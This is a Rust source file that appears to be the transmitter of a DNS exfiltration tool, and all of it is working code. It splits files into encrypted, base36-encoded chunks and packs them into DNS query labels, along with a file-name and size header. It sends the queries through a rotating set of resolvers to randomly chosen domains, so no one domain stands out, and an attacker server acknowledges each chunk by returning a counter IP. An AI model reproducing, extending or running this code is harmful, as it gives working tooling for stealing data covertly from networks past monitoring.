use crate::base36;
use crate::config::Config;
use crate::crypto::{derive_key, encrypt};
use crate::limits::{chunk_payload_budget_chars, encoded_len_for_payload};
use crate::metadata::ExfilSession;
use crate::resolver::ResolverPool;
use anyhow::{anyhow, Context, Result};
use rand::Rng;
use std::convert::TryInto;
use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::time::Duration;
use trust_dns_proto::op::{Message, MessageType, OpCode, Query};
use trust_dns_proto::rr::{Name, RData, RecordType};
use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};

const LABEL_CAP: usize = 62;
const SESSION_TAG_LEN: usize = 3;
const SESSION_TAG_PREFIX: char = 'E';
const HEADER_CHUNK_INDEX: u32 = u32::MAX;
const META_LABEL_PREFIX: &str = "EX";
const PAD_LABEL: &str = "0";
const ENVELOPE_VERSION: u8 = 1;
const ENVELOPE_LEN: usize = SESSION_TAG_LEN + 1 + 1 + 4; // tag + version + flags + counter
const ENVELOPE_FLAG_INIT: u8 = 0x01;
const ENVELOPE_FLAG_CHUNK: u8 = 0x02;
const ENVELOPE_FLAG_COMPLETE: u8 = 0x04;
const ENVELOPE_FLAG_METADATA: u8 = 0x08;
const ENVELOPE_FLAG_FINAL: u8 = 0x10;
const FLAG_HEADER: u8 = 0x01;

pub struct DnsTransmitter {
    cfg: Config,
    pool: ResolverPool,
    aes_key: [u8; 32],
    last_domain: Option<String>,
    ack_next: Ipv4Addr,
}

impl DnsTransmitter {
    pub fn new(cfg: Config, pool: ResolverPool) -> Self {
        let aes_key = derive_key(cfg.encryption_key);
        let ack_ip = cfg
            .server_ip()
            .parse::<Ipv4Addr>()
            .unwrap_or_else(|_| Ipv4Addr::new(127, 0, 0, 1));
        let ack_next = increment_ip(ack_ip);
        Self {
            cfg,
            pool,
            aes_key,
            last_domain: None,
            ack_next,
        }
    }

    pub fn send_header(&mut self, session: &ExfilSession) -> Result<()> {
        let total_frames: u32 = session
            .total_frames()
            .try_into()
            .map_err(|_| anyhow!("transfer requires too many frames for counter width"))?;
        self.send_frame(session, FrameDescriptor::init(total_frames), None)
    }

    pub fn send_metadata_chunk(&mut self, session: &ExfilSession) -> Result<()> {
        let payload = build_metadata_payload(session);
        ensure_payload_within_budget(payload.len())?;
        self.send_frame(session, FrameDescriptor::chunk(0), Some(&payload))
    }

    pub fn send_chunk(&mut self, session: &ExfilSession, index: usize, chunk: &[u8]) -> Result<()> {
        let frame_index = index
            .checked_add(1)
            .ok_or_else(|| anyhow!("chunk index overflow"))? as u32;
        ensure_payload_within_budget(chunk.len())?;
        self.send_frame(session, FrameDescriptor::chunk(frame_index), Some(chunk))
    }

    pub fn send_completion(&mut self, session: &ExfilSession) -> Result<()> {
        self.send_frame(session, FrameDescriptor::complete(), None)
    }

    fn send_frame(
        &mut self,
        session: &ExfilSession,
        descriptor: FrameDescriptor,
        payload: Option<&[u8]>,
    ) -> Result<()> {
        if descriptor.requires_payload() != payload.is_some() {
            return Err(anyhow!("chunk frames must include payload data"));
        }

        let (meta_label, data_label) = self.build_labels(session, &descriptor, payload)?;
        let qname = self.build_name(&meta_label, &data_label)?;

        let mut last_err = None;
        for attempt in 0..3 {
            let resolver = self.pool.next();
            match self.dispatch(&qname, resolver) {
                Ok(true) => return Ok(()),
                Ok(false) => {
                    last_err = Some(anyhow!(
                        "resolver {} rejected chunk (attempt {})",
                        resolver,
                        attempt + 1
                    ));
                }
                Err(e) => last_err = Some(e),
            }
        }

        Err(last_err.unwrap_or_else(|| anyhow!("failed to send frame")))
    }

    fn dispatch(&self, name: &Name, resolver: SocketAddr) -> Result<bool> {
        let mut msg = Message::new();
        msg.set_id(rand::thread_rng().gen());
        msg.set_message_type(MessageType::Query);
        msg.set_op_code(OpCode::Query);
        msg.set_recursion_desired(true);
        msg.add_query(Query::query(name.clone(), RecordType::A));

        let mut buf = Vec::with_capacity(512);
        let mut encoder = BinEncoder::new(&mut buf);
        msg.emit(&mut encoder)?;

        let socket = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))?;
        socket.set_read_timeout(Some(Duration::from_secs(2)))?;
        socket.send_to(&buf, resolver)?;

        let mut resp_buf = [0u8; 512];
        let (size, _) = socket.recv_from(&mut resp_buf)?;
        let resp = Message::from_vec(&resp_buf[..size])?;

        let ack = resp
            .answers()
            .iter()
            .find_map(|record| match record.data() {
                Some(RData::A(ip)) => Some(ip.0),
                _ => None,
            });

        Ok(matches!(ack, Some(ip) if ip == self.ack_next))
    }

    fn build_name(&mut self, meta_label: &str, data_label: &str) -> Result<Name> {
        let domain = self.select_domain();
        let fqdn = format!("{}.{}.{}", meta_label, data_label, domain);
        Name::from_ascii(fqdn).context("invalid query name")
    }

    fn build_labels(
        &self,
        session: &ExfilSession,
        descriptor: &FrameDescriptor,
        payload: Option<&[u8]>,
    ) -> Result<(String, String)> {
        let meta = self.build_metadata_label(session, descriptor)?;
        let data = match payload {
            Some(bytes) => {
                if bytes.is_empty() {
                    return Err(anyhow!("chunk payload must not be empty"));
                }
                self.build_payload_label(bytes)?
            }
            None => PAD_LABEL.to_string(),
        };
        Ok((meta, data))
    }

    fn build_metadata_label(
        &self,
        session: &ExfilSession,
        descriptor: &FrameDescriptor,
    ) -> Result<String> {
        let mut buf = Vec::with_capacity(ENVELOPE_LEN);
        buf.push(ENVELOPE_VERSION);
        buf.push(self.envelope_flags(session, descriptor));
        let tag = encode_session_tag(session.session_id);
        if tag.as_bytes().len() != SESSION_TAG_LEN {
            return Err(anyhow!("invalid session tag length"));
        }
        buf.extend_from_slice(tag.as_bytes());
        let counter = descriptor.counter_value();
        buf.extend_from_slice(&counter.to_le_bytes());

        let ciphertext = encrypt(&buf, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
        let encoded = base36::encode(&ciphertext);
        let total_len = META_LABEL_PREFIX.len() + encoded.len();
        if total_len > LABEL_CAP {
            return Err(anyhow!(
                "metadata label ({total_len} chars) exceeds label budget {LABEL_CAP}"
            ));
        }
        Ok(format!("{}{}", META_LABEL_PREFIX, encoded))
    }

    fn envelope_flags(&self, session: &ExfilSession, descriptor: &FrameDescriptor) -> u8 {
        match descriptor.phase {
            FramePhase::Init { .. } => ENVELOPE_FLAG_INIT,
            FramePhase::Chunk { chunk_index } => {
                let mut flags = ENVELOPE_FLAG_CHUNK;
                if chunk_index == 0 {
                    flags |= ENVELOPE_FLAG_METADATA;
                }
                if chunk_index as usize == session.job.total_chunks {
                    flags |= ENVELOPE_FLAG_FINAL;
                }
                flags
            }
            FramePhase::Complete => ENVELOPE_FLAG_COMPLETE,
        }
    }

    fn build_payload_label(&self, bytes: &[u8]) -> Result<String> {
        ensure_payload_within_budget(bytes.len())?;
        let ciphertext = encrypt(bytes, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
        let encoded = base36::encode(&ciphertext);
        if encoded.len() > LABEL_CAP {
            return Err(anyhow!(
                "payload label length {} exceeds label budget {LABEL_CAP}",
                encoded.len()
            ));
        }
        Ok(encoded)
    }

    fn select_domain(&mut self) -> String {
        let domains = self.cfg.dns_domains();
        if domains.is_empty() {
            return "example.com".to_string();
        }

        if domains.len() == 1 {
            self.last_domain = Some(domains[0].to_string());
            return domains[0].to_string();
        }

        let mut rng = rand::thread_rng();
        let mut candidates: Vec<&str> = domains.iter().copied().collect();
        if let Some(last) = &self.last_domain {
            candidates.retain(|d| d != last);
            if candidates.is_empty() {
                candidates = domains.iter().copied().collect();
            }
        }

        let choice = candidates[rng.gen_range(0..candidates.len())].to_string();
        self.last_domain = Some(choice.clone());
        choice
    }
}

#[derive(Clone)]
struct FrameDescriptor {
    phase: FramePhase,
}

impl FrameDescriptor {
    fn init(total_frames: u32) -> Self {
        Self {
            phase: FramePhase::Init { total_frames },
        }
    }

    fn chunk(index: u32) -> Self {
        Self {
            phase: FramePhase::Chunk { chunk_index: index },
        }
    }

    fn complete() -> Self {
        Self {
            phase: FramePhase::Complete,
        }
    }

    fn requires_payload(&self) -> bool {
        matches!(self.phase, FramePhase::Chunk { .. })
    }

    fn counter_value(&self) -> u32 {
        match self.phase {
            FramePhase::Init { total_frames } => total_frames,
            FramePhase::Chunk { chunk_index } => chunk_index,
            FramePhase::Complete => 0,
        }
    }
}

#[derive(Clone, Copy)]
enum FramePhase {
    Init { total_frames: u32 },
    Chunk { chunk_index: u32 },
    Complete,
}

fn build_metadata_payload(session: &ExfilSession) -> Vec<u8> {
    let mut buf = Vec::with_capacity(160);
    buf.push(1); // version
    buf.push(FLAG_HEADER);
    buf.extend_from_slice(&session.session_id.to_le_bytes());
    buf.extend_from_slice(&session.job.job_id.to_le_bytes());
    buf.extend_from_slice(&HEADER_CHUNK_INDEX.to_le_bytes());
    buf.extend_from_slice(&(session.job.total_chunks as u32).to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&(session.job.total_size as u64).to_le_bytes());

    let name_bytes = session.job.file_name.as_bytes();
    let name_len = name_bytes.len().min(63);
    buf.push(name_len as u8);
    buf.extend_from_slice(&name_bytes[..name_len]);

    let note_bytes = session.job.note.as_bytes();
    let note_len = note_bytes.len().min(63);
    buf.push(note_len as u8);
    buf.extend_from_slice(&note_bytes[..note_len]);
    buf
}

fn encode_session_tag(session_id: u32) -> String {
    let digits = SESSION_TAG_LEN.saturating_sub(1);
    if digits == 0 {
        return SESSION_TAG_PREFIX.to_string();
    }
    let max = max_value_for_width(digits);
    let modulus = max.saturating_add(1);
    let normalized = if modulus == 0 {
        session_id
    } else {
        session_id % modulus
    };
    let suffix = encode_base36_fixed(normalized, digits).expect("fixed width encoding");
    format!("{}{}", SESSION_TAG_PREFIX, suffix)
}

fn encode_base36_fixed(value: u32, width: usize) -> Result<String> {
    if width == 0 {
        return Err(anyhow!("width must be greater than zero"));
    }

    let alphabet = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut buf = vec![b'0'; width];
    let mut remaining = value;
    for idx in (0..width).rev() {
        buf[idx] = alphabet[(remaining % 36) as usize];
        remaining /= 36;
    }

    if remaining != 0 {
        return Err(anyhow!("value {} does not fit width {}", value, width));
    }

    Ok(String::from_utf8(buf).expect("ascii"))
}

fn max_value_for_width(width: usize) -> u32 {
    36u32.saturating_pow(width as u32).saturating_sub(1)
}

fn increment_ip(ip: Ipv4Addr) -> Ipv4Addr {
    let mut octets = ip.octets();
    for idx in (0..4).rev() {
        if octets[idx] == 255 {
            octets[idx] = 0;
        } else {
            octets[idx] += 1;
            break;
        }
    }
    Ipv4Addr::from(octets)
}

fn ensure_payload_within_budget(bytes: usize) -> Result<()> {
    let encoded = encoded_len_for_payload(bytes);
    let budget = chunk_payload_budget_chars();
    if encoded > budget {
        return Err(anyhow!(
            "payload of {} bytes expands to {} base36 chars (max {})",
            bytes,
            encoded,
            budget
        ));
    }
    Ok(())
}
